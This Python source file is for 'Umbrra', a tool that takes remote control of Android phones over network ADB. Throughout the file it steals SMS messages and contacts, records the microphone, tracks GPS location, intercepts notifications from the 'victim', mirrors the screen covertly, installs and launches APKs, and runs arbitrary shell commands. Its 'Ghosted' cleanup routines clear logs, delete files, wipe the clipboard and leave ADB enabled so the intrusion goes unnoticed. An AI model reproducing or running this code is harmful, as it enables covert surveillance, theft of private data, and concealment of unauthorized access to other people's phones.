import subprocess
import argparse
import sys
import os
import time
import re
from rich.console import Console
from rich.text import Text
import shlex
console = Console()
def print_gradient_ascii(ascii_text):
    console = Console()
    lines = [line for line in ascii_text.splitlines() if line.strip()]
    if not lines: return

    palette = [
        (147, 0, 211),   
        (0, 191, 255),   
        (0, 255, 127)    
    ]

    height = len(lines)
    max_width = max(len(line) for line in lines)
    
    frequency = 1.5

    for y, line in enumerate(lines):
        rich_text = Text()
        for x, char in enumerate(line):
            base_progress = (x / max_width + y / height) / 2
            
            progress = (base_progress * frequency) % 1.0
            
            progress = min(0.999, max(0.0, progress))

            section_size = 1.0 / (len(palette) - 1)
            section = int(progress // section_size)
            local_mix = (progress % section_size) / section_size

            c1 = palette[section]
            c2 = palette[section + 1]

            r = int(c1[0] + (c2[0] - c1[0]) * local_mix)
            g = int(c1[1] + (c2[1] - c1[1]) * local_mix)
            b = int(c1[2] + (c2[2] - c1[2]) * local_mix)
            
            rich_text.append(char, style=f"rgb({r},{g},{b})")
        
        console.print(rich_text)
class GhostADB:
    def __init__(self, target):
        if ":" not in target:
            self.target = f"{target}:5555"
        else:
            self.target = target

        if getattr(sys, 'frozen', False):
            self.base_path = sys._MEIPASS
        else:
            self.base_path = os.path.dirname(os.path.abspath(__file__))
            
        self.adb = os.path.join(self.base_path, "ADB", "adb.exe")
        
        if not os.path.exists(self.adb):
            console.print(f"[bold yellow][!][/] Critical Error: adb.exe not found at {self.adb}")
            sys.exit(1)
            
    def run(self, command, silent=False):
        full_cmd = f"\"{self.adb}\" -s {self.target} {command}"
        try:
            result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True)
            if not silent and result.stdout:
                return result.stdout.strip()
            return result.stdout
        except Exception as e:
            return f"Error: {e}"

    def full_disconnect(self):
            console.print("[bold green][+][/] Local ADB process [bold white]terminated[/].")
            subprocess.run(f"\"{self.adb}\" disconnect {self.target}", shell=True, capture_output=True)
            subprocess.run(f"\"{self.adb}\" kill-server", shell=True, capture_output=True)
            print("[+] Local ADB process terminated. Target ports remain open.")

    def connect(self):
        console.print(f"[bold blue][*][/] Connecting to [bold turquoise2]{self.target}[/]...")
        res = subprocess.run(f"\"{self.adb}\" connect {self.target}", shell=True, capture_output=True, text=True)
        return res.stdout.strip()

    def hard_cleanup(self):
            """Максимально глубокая очистка следов на устройстве"""
            console.print(f"[bold yellow]\n[!][/] Starting fully cleanup")
            
            commands = [
                "shell logcat -b all -c",                     
                "shell rm -rf /data/local/tmp/*",             
                "shell rm -rf /sdcard/Android/data/*/cache/*",
                "shell settings put global adb_enabled 1",     
                "shell service call clipboard 2 i32 1 s16 ''",
                "shell rm /data/local/tmp/.ash_history",      
                "shell rm /sdcard/*.png /sdcard/*.mp4",       
                "shell pm trim-caches 999G",                  
                "shell history -c"                            
            ]

            for cmd in commands:
                self.run(cmd, silent=True)
                console.print(f"[bold cyan][*][/] Executed: {cmd.split(' ', 1)[1]}")

            subprocess.run(f"\"{self.adb}\" disconnect {self.target}", shell=True, capture_output=True)
            subprocess.run(f"\"{self.adb}\" kill-server", shell=True, capture_output=True)
            print("[+++] Ghosted.")

    def get_location(self):
        data = self.run("shell dumpsys location")
        loc_match = re.search(r"last location=Location\[\w+\s+([\d\.-]+),([\d\.-]+)", data)
        if loc_match:
            lat, lon = loc_match.groups()
            return f"Latitude: {lat}, Longitude: {lon}\nGoogle Maps: https://www.google.com/maps?q={lat},{lon}"
        return "[!] Could not find last known location. GPS might be disabled."

    def stealth_mirror(self):
            scrcpy_path = os.path.join(self.base_path, "ADB", "scrcpy.exe")
            adb_dir = os.path.join(self.base_path, "ADB")
            
            if not os.path.exists(scrcpy_path):
                return f"[!] scrcpy.exe not found at {scrcpy_path}"
            
            env = os.environ.copy()
            env["ADB"] = self.adb
            env["PATH"] = adb_dir + os.pathsep + env.get("PATH", "")
            
            cmd = [
                scrcpy_path,
                "-s", self.target,
                "--no-audio",
                "--always-on-top",
                "--video-bit-rate", "2M",
                "--max-size", "1024",
                "--video-codec", "h264",
                "--window-title", "Umbrra Mirror"
            ]
            
            try:
                with open("scrcpy_error.log", "w") as f:
                    subprocess.Popen(
                        cmd,
                        env=env,
                        stdout=f,
                        stderr=f,
                        creationflags=subprocess.CREATE_NO_WINDOW if getattr(sys, 'frozen', False) else 0
                    )
                return "[*] Mirroring initiated. Using H.264 @ 2Mbps. Keep terminal open!"
            except Exception as e:
                return f"[!] Subprocess error: {e}"
    
    def auto_install(self, apk_path):
        console.print(f"[bold cyan][*][/] Installing APK: {apk_path}...")
        res = subprocess.run(f"\"{self.adb}\" -s {self.target} install -r \"{apk_path}\"", shell=True, capture_output=True, text=True)
        console.print(f"[bold green][+][/] {res.stdout.strip()}")
        
        console.print("[bold cyan][*][/] Attempting to launch app...")
        launch = self.run("shell monkey -p $(pm list packages -3 | tail -1 | cut -f 2 -d ':') -c android.intent.category.LAUNCHER 1", silent=True)
        
        #fallback monke
        if "error" in launch.lower() or not launch:
            console.print(f"[bold yellow][!][/] Monkey failed, trying manual activity launch...")
            pkg = self.run("shell pm list packages -3 | tail -1 | cut -f 2 -d ':'", silent=True)
            self.run(f"shell am start -n {pkg}/.MainActivity", silent=True)

    def export_data(self):
        console.print("[bold cyan][*][/] Exporting SMS and Contacts...")
        contacts = self.run("shell content query --uri content://contacts/phones --projection display_name:number", silent=True)
        sms = self.run("shell content query --uri content://sms/inbox --projection address:body", silent=True)
        
        save_path = "umbrra_export.txt"
        with open(save_path, "w", encoding="utf-8") as f:
            f.write(f"--- CONTACTS ---\n{contacts}\n\n--- SMS ---\n{sms}")
        return f"[+] Data saved to {save_path}"

    def record_mic(self, duration=5):
        remote_path = f"/data/local/tmp/rec.wav"
        console.print(f"[bold cyan][*][/] Recording for {duration}s...")
        

        cmd = self.run(f"shell arecord -d {duration} -f S16_LE -r 44100 {remote_path}", silent=True)
        if "not found" in cmd.lower():
            console.print(f"[bold yellow][!][/] arecord not found, switching to tinycap fallback...")
            self.run(f"shell tinycap {remote_path} -t {duration}", silent=True)
        
        time.sleep(duration + 0.5)
        
        local_path = os.path.join(os.getcwd(), f"rec_{int(time.time())}.wav")
        subprocess.run(f"\"{self.adb}\" -s {self.target} pull {remote_path} \"{local_path}\"", shell=True, capture_output=True)
        self.run(f"shell rm {remote_path}", silent=True)
        return f"[+] Audio downloaded: {local_path}"
    
    def get_accounts(self):
        console.print("[bold cyan][*][/] Retrieving linked accounts...")
        data = self.run("shell dumpsys account", silent=True)
        accounts = re.findall(r"name=(.*?),", data)
        return "\n".join([f"[+] {acc}" for acc in set(accounts)]) if accounts else "[!] No accounts found."

    def get_notifications(self):
            console.print("[bold cyan][*][/] Intercepting deep notification data...")
            raw_data = self.run("shell dumpsys notification", silent=True)
            notifs = []
            
            found = re.findall(r"(android\.(?:title|text|subText|infoText))=([\s\S]+?)(?=\s+android\.|\s+extras=|\s+})", raw_data)
            
            for key, value in found:
                val = value.strip().replace('"', '')
                # Отсеиваем системный мусор
                if val and val.lower() != "null" and "String" not in val and len(val) > 1:
                    notifs.append(f"[+] {key.split('.')[-1]}: {val}")

            if not notifs:
                return "[!] Buffer empty or data protected. Try sending a test message to the victim."
            
            return "\n".join(list(dict.fromkeys(notifs))[-15:])
            
    def anonymous_exit(self):
        console.print(f"[bold yellow]\n[!][/] Stealth Mode: Deep cleaning...")
        self.run("shell logcat -b all -c", silent=True) # Clear logs
        self.run("shell rm /data/local/tmp/.ash_history 2>/dev/null", silent=True)
        self.run("shell service call clipboard 2 i32 1 s16 ''", silent=True) # Clear clipboard
        subprocess.run(f"\"{self.adb}\" disconnect {self.target}", shell=True, capture_output=True)
        subprocess.run(f"\"{self.adb}\" kill-server", shell=True, capture_output=True)
        console.print(f"[bold green][+][/] Ghosted. All traces removed. Goodbye.")

def main():
    console = Console()
    console.print(rf"[bold cyan]Welcome,[/]")
    ART = r"""
             ___.                        
 __ __  _____\_ |_____________________   
|  |  \/     \| __ \_  __ \_  __ \__  \  
|  |  /  Y Y  \ \_\ \  | \/|  | \// __ \_
|____/|__|_|  /___  /__|   |__|  (____  /
            \/    \/                  \/ 
    Umbrra v1.2
-------------------------------------------------------
    """
    
    print_gradient_ascii(ART)
    
   
    parser = argparse.ArgumentParser(
        description="", 
        add_help=False,
        usage=argparse.SUPPRESS
    )

    parser.add_argument("target", nargs='?', help="Target IP address")
    parser.add_argument("--screen", action="store_true", help="Take screenshot to Desktop")
    parser.add_argument("--video", type=str, help="Launch YouTube URL")
    parser.add_argument("--shell", type=str, help="Execute custom shell command")
    parser.add_argument("--volume", type=int, help="Set media volume (0-15)")
    parser.add_argument("--info", action="store_true", help="Get device info")
    parser.add_argument("--apps", action="store_true", help="List user apps")
    parser.add_argument("--off", action="store_true", help="Soft turn off (Sleep)")
    parser.add_argument("--toast", type=str, help="Show toast message")
    parser.add_argument("--install", type=str, help="Install APK and auto-launch")
    parser.add_argument("--export", action="store_true", help="Export SMS and Contacts")
    parser.add_argument("--record", type=int, help="Record mic (seconds)")
    parser.add_argument("--reboot", action="store_true", help="Reboot target device")
    parser.add_argument("--mirror", action="store_true", help="Start Stealth Mirror")
    parser.add_argument("--accounts", action="store_true", help="Show linked accounts")
    parser.add_argument("--notifs", action="store_true", help="Intercept notifications")
    parser.add_argument("--where", action="store_true", help="Get GPS location")
    parser.add_argument("--intshell", action="store_true", help="Open interactive shell")
    parser.add_argument("--anon", action="store_true", help="Anonymous exit")
    parser.add_argument("--silent", action="store_true", help="Minimal output")

    args = parser.parse_args()
    console = Console()
    if not args.target:
        args.target = console.input(r"[bold purple]umbrra[/] [bold white]\[[/][bold yellow]enter target ip[/][bold white]]> [/]").strip()
        if not args.target: 
            console.print(f"[bold yellow][!][/] No target specified. Exiting...")
            sys.exit(0)

    ghost = GhostADB(args.target)
        
        
    def execute_commands(cmd_args):
        if cmd_args.info:
            model = ghost.run("shell getprop ro.product.model")
            ver = ghost.run("shell getprop ro.build.version.release")
            uptime = ghost.run("shell uptime")
            console.print(f"[bold cyan][*][/] Model: {model}\n [bold cyan][*][/] Android: {ver}\n [bold cyan][*][/] {uptime}")

        if cmd_args.apps:
            console.print("[bold cyan][*][/] Installed User Apps:")
            print(ghost.run("shell pm list packages -3 | cut -f 2 -d ':'"))

        if cmd_args.off:
            ghost.run("shell input keyevent 223")

        if cmd_args.toast:
            ghost.run(f"shell am start -a android.intent.action.VIEW -d \"{cmd_args.toast}\"")

        if cmd_args.volume is not None:
            ghost.run(f"shell media volume --set {cmd_args.volume}")

        if cmd_args.screen:
            path = os.path.join(os.environ['USERPROFILE'], 'Desktop', f'ghost_{int(time.time())}.png')
            subprocess.run(f"\"{ghost.adb}\" -s {ghost.target} shell screencap -p > \"{path}\"", shell=True)
            console.print(f"[bold cyan][*][/] Saved: {path}")

        if cmd_args.video:
            ghost.run(f"shell am start -a android.intent.action.VIEW -d {cmd_args.video}")

        if cmd_args.shell:
            console.print(f"[bold cyan][*][/] Result:\n{ghost.run('shell ' + cmd_args.shell)}")

        if cmd_args.reboot:
            ghost.run("reboot")

        if cmd_args.accounts:
            print(ghost.get_accounts())

        if cmd_args.notifs:
            print(ghost.get_notifications())

        if cmd_args.install:
            ghost.auto_install(args.install)

        if cmd_args.export:
            print(ghost.export_data())

        if cmd_args.record:
            print(ghost.record_mic(args.record))

        if cmd_args.mirror:
            print(ghost.stealth_mirror())

        if cmd_args.where:
            console.print("[bold cyan][*][/] Tracking device...")
            print(ghost.get_location())
            
        if cmd_args.anon:
            ghost.anonymous_exit()            

        if cmd_args.intshell:
            console.print(f"[bold cyan][*][/] Entering Interactive Shell. Type 'exit' to leave.")
            os.system(f"\"{ghost.adb}\" -s {ghost.target} shell")

    connect_res = ghost.connect()
    console.print(f"[bold green][+][/] {connect_res}")

    if len(sys.argv) > 2:
            execute_commands(args)
            subprocess.run(f"\"{ghost.adb}\" disconnect {ghost.target}", shell=True, capture_output=True)
            return

    console.print(f"[bold green][*][/] [bold cyan]Umbrra[/] [bold white]active.[/] [dim white]Type[/] [bold yellow]'help'[/] [dim white]for commands or[/] [bold red]'exit'[/] [dim white]to quit.[/]")
    
    try:
        while True:
            prompt = f"[bold magenta]umbrra[/][bold white]@[/][bold turquoise2]{ghost.target}[/][bold white]> [/]"
            cmd_line = console.input(prompt).strip()
            
            if not cmd_line: continue
            if cmd_line.lower() in ['exit', 'quit']: break
            
            if cmd_line.lower() == 'cleanup':
                ghost.hard_cleanup()
                continue
            # ----------------------

            if cmd_line.lower() == 'help':
                parser.print_help()
                print("  cleanup             Deep cleaning of logs, cache, and history")
                continue
            try:
                current_args = parser.parse_args(shlex.split(cmd_line))
                
                execute_commands(current_args)
                
            except SystemExit: continue 
            except Exception as e: print(f"[!] Error: {e}")

    except KeyboardInterrupt:
        print("\n[!] Emergency exit.")
    finally:
        ghost.full_disconnect()
        console.print(f"[bold green][+][/] Ghosted.")
        
if __name__ == "__main__":
    main()